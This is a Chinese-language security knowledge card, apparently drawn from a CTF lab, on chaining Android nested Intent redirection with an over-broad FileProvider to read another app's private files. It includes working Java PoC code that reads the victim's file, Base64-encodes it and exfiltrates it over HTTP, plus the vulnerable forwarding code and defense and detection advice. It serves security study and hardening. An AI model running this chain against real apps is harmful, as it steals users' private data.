---
id: mobile-android-intent-redirection-fileprovider-grant-uri-private-file-read
title: 嵌套 Intent 重定向 + FileProvider grantUriPermissions：借助受害者应用身份读取其私有目录文件
type: scenario
domain: mobile
path: mobile/android
technique: intent-redirection-fileprovider-grant-uri-cross-app-read
tags:
- android
- intent-redirection
- fileprovider
- content-provider
- sandbox
- uri-permission
- mobile
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W1
  verified_at: '2026-11-08T11:31:24+08:00'
  notes: 已对照原文核对；原文 Vulnerable.java 中 getIntent().getParcelableExtra(intent) 直接 startActivity、Manifest 中 FileProvider grantUriPermissions=true 且 file_paths.xml 为 root-path path=''、 evils Intent 带 content:// 与 READ/ WRITE flags 值 3，与卡片原理与 PoC 一致；未验证点：原文以 CTF 靶场为环境，一般应用是否同样可读需按厂商实现复核，卡片未标受影响版本（原文无版本信息）
url: /docs/mobile/android/mobile-android-intent-redirection-fileprovider-grant-uri-private-file-read/
draft: false
kb_aliases:
- Intent 重定向读私有文件
- FileProvider 临时授权绕过沙箱
- 嵌套 Intent 转发
- grantUriPermissions root-path
- FLAG_GRANT_READ_URI_PERMISSION
---

## 一句话结论

当某个导出 Activity 把 `getIntent().getParcelableExtra("intent")` 取出的 Intent 直接交给 `startActivity()` 时，攻击者应用可以塞进一个「带 `content://` data 且 flags 含 `FLAG_GRANT_READ_URI_PERMISSION|FLAG_GRANT_WRITE_URI_PERMISSION`」的嵌套 Intent；转发方以**它自己的 UID** 执行这次启动，把 URI 临时授权一并授予目标组件，于是原本受沙箱保护的受害者私有文件（本例 `/data/user/0/<pkg>/files/flag`）被攻击者组件读走。

## 原理

- **Intent 重定向的本质**：`startActivity()` 的权限判定看的是「谁在调用」——被重定向的 Intent 由中间人应用（导出 Activity 所属应用）发起，因此它携带的是中间人应用的身份与权限，而不是最初的攻击者。任何把外部传入的 Intent 原样转发、且自身导出可被外部启动的组件，都等于给攻击者提供了一个「以自己身份执行 Intent」的跳板。
- **嵌套 Parcelable 让危险 Intent 绕过入口检查**：第一层 Intent 是正常的显式 Intent（`setClassName(受害包名, Vulnerable)`），只带一个 extra；真正的危险 Intent 被 `putExtra("intent", evil)` 序列化进 Bundle。入口处的包名白名单/action 校验只看到第一层，看不到里层的 `data` 与 `flags`。
- **FileProvider 的临时授权**：`android:grantUriPermissions="true"` 的 Provider 允许持有者针对具体 URI 发放一次性读写权限；调用方只要在 Intent 上设置 `FLAG_GRANT_READ_URI_PERMISSION`（值 1）或 `FLAG_GRANT_WRITE_URI_PERMISSION`（值 2），系统在启动目标组件时就把该 URI 的对应权限授予接收方进程（`ContentResolver` 层校验 `UriPermission`，而不是文件权限位）。
- **`file_paths.xml` 里 `<root-path name="root" path="" />` 把根目录整体纳入共享范围**：FileProvider 只对「`<paths>` 声明的目录」下的 URI 放行。写 `root-path` 且 `path=""` 等于把整个文件系统根纳入映射，因此 `content://<authority>/root/data/data/<pkg>/files/flag` 这种指向应用私有目录的 URI 也合法；如果只声明 `files-path` 且限制子目录，这类跨越就不可用。
- **为什么能读到别人的私有目录**：文件本身仍是 `-rw` 且属主是受害者 UID，攻击者进程没有文件系统权限；但读取走的是 `ContentResolver.openInputStream(content://...)`，由受害者应用的 Provider 进程（同 UID）去打开文件再回传字节流。授权对象是 URI，不是文件路径，所以沙箱没有被绕过，只是被「代读」了。
- **本地权限必须在开始前就位**：Intent 跳转本身不携带任何文件权限，能读到文件完全依赖前面几步（重定向身份 + Provider 声明范围 + grant flags）三者同时成立。

## 触发条件

- 受害者应用存在导出的 Activity/Service/Receiver，其中把外部传入的 Parcelable/嵌套 Intent 直接用于 `startActivity`/`startService`/`sendBroadcast`（没有校验 component、action、data scheme 与 flags）。
- 受害者应用声明了 `android:grantUriPermissions="true"` 的 FileProvider，且 `file_paths.xml` 用 `root-path`（`path=""`）或覆盖了目标敏感文件所在目录。
- 目标文件位于受害者应用可访问路径（自己的私有目录最典型）。
- 攻击者应用能启动该导出组件（`exported="true"` 或未显式设置但含 intent-filter）。

## 利用步骤

1. 静态确认：反编译查看 `AndroidManifest.xml` 中 `exported` 组件与 `<provider>` 的 `authorities`、`grantUriPermissions`；再看 `res/xml/file_paths.xml` 是否写了 `root-path`/`external-path` 且 `path` 为空。
2. 找到重定向点：在导出组件的代码里搜索 `getParcelableExtra`、`getIntent()`、`startActivity(`、`startService(`，确认传入 Intent 未经 `setPackage`/component 白名单约束。
3. 在攻击者应用里构造两层 Intent：外层显式指向重定向组件，内层 `setClass` 指向攻击者自己的读取组件、`setData(content://...)`、`addFlags(READ|WRITE)`。
4. `startActivity(外层)` 后，被重定向的内层 Intent 会以受害者身份启动攻击者组件，攻击者组件随即通过 `getContentResolver().openInputStream(getIntent().getData())` 读取内容。
5. 把读到的内容编码后经 HTTP 传出（Android 侧不便直接打印到控制台），在接收端解码确认拿到敏感文件。
6. 变体验证：把 flags 改成只读（值 1）确认最小权限即可成功；把 data 换成 `content://<authority>/root/data/data/<pkg>/databases/xxx.db` 验证同目录下其他敏感文件。

## PoC

```java
// 攻击者应用：构造嵌套 Intent
Intent evil = new Intent();
evil.setClass(this, ExfilActivity.class);                       // 攻击者自己的读取组件
evil.setData(Uri.parse(
    "content://androidx.core.content.FileProvider/root"
  + "/data/data/com.victim.app/files/flag"));                    // 受害应用私有文件
evil.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION
            | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);            // 值 3

Intent outer = new Intent();
outer.setClassName("com.victim.app", "com.victim.app.Vulnerable"); // 导出且会转发
outer.putExtra("intent", evil);
startActivity(outer);
```

```java
// 受害应用里被滥用的转发点
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    Intent inner = getIntent().getParcelableExtra("intent");  // 外部完全可控
    startActivity(inner);                                     // 以自己的身份启动
}
```

```xml
<!-- 受害应用：Provider 授权范围设置过宽 -->
<provider android:name="androidx.core.content.FileProvider"
          android:authorities="androidx.core.content.FileProvider"
          android:grantUriPermissions="true"
          android:exported="false">
    <meta-data android:name="android.support.FILE_PROVIDER_PATHS"
               android:resource="@xml/file_paths"/>
</provider>
<!-- res/xml/file_paths.xml -->
<paths><root-path name="root" path="" /></paths>
```

```java
// 攻击者读取组件：靠被授予的 URI 权限代读
InputStream in = getContentResolver().openInputStream(getIntent().getData());
String s = Base64.encodeToString(IOUtils.toString(in).getBytes("UTF-8"), Base64.DEFAULT)
                .replaceAll("\n", "");
httpGet(s);
```

## 变体与关联

- **重定向点变体**：`startService`/`bindService`/`sendBroadcast` 同样可被滥用；`PendingIntent` 被原样包装转发时也会把授权带给第三方。
- **授权范围变体**：`external-path`、`files-path`、`cache-path` 各自覆盖不同目录；`path=""` 或 `path="."` 是最宽的写法；若只写了 `files-path` 的子目录，则只能读该子目录。
- **无 FileProvider 时**：若导出组件还能接受 `file://` 或 `content://` 给其他 Provider，可尝试其他导出的 ContentProvider（`exported=true` 且无权限保护）直接查询。
- **关联**：同一题的第二问用 Intent 重定向把 WebView 的 `file://` 加载能力当跳板做存储型 XSS，见 [[mobile-android-intent-redirect-webview-cookie-stored-xss-file-symlink]]；WebView 的 file 协议配置问题见 [[mobile-android-webview-file-universal-access-local-read]]；导出组件缺认证的通用情形见 [[mobile-android-exported-activity-unauth-changepassword-phishing]]。
- **边界**：转发组件若校验了 `component`/`package`、剥离了 `flags`、或者 `getParcelableExtra` 后重新 `new Intent()` 复制白名单字段，本链失效；FileProvider 未声明 `grantUriPermissions` 时系统会拒绝授予。

## 检测与防御

- **代码侧**：转发外部 Intent 前用 `setPackage(getPackageName())`、限定 component 白名单、清除 `FLAG_GRANT_*`，并对 `data` 的 scheme/authority 做白名单校验；不要 `startActivity(getIntent().getParcelableExtra(...))` 直接透传。
- **清单侧**：不需要外部启动的组件一律 `android:exported="false"`；`grantUriPermissions` 仅在真实需要分享文件时开启，并配合 `FLAG_GRANT_READ_URI_PERMISSION` 单次授权。
- **FileProvider 配置**：`file_paths.xml` 只声明具体子目录（`files-path` + `path="exports/"`），绝不用 `root-path` 且 `path=""`；README/基线检查里把 `root-path` 列为高危配置。
- **检测信号**：静态扫描 `root-path` + `path=""`、`grantUriPermissions=true`、导出 Activity 中的 `getParcelableExtra("intent")` 与 `startActivity` 组合；运行时监控应用进程通过 `ContentResolver` 读取不属于自身业务目录的 URI，以及短时间内启动外部 component 后紧跟 HTTP 外传。
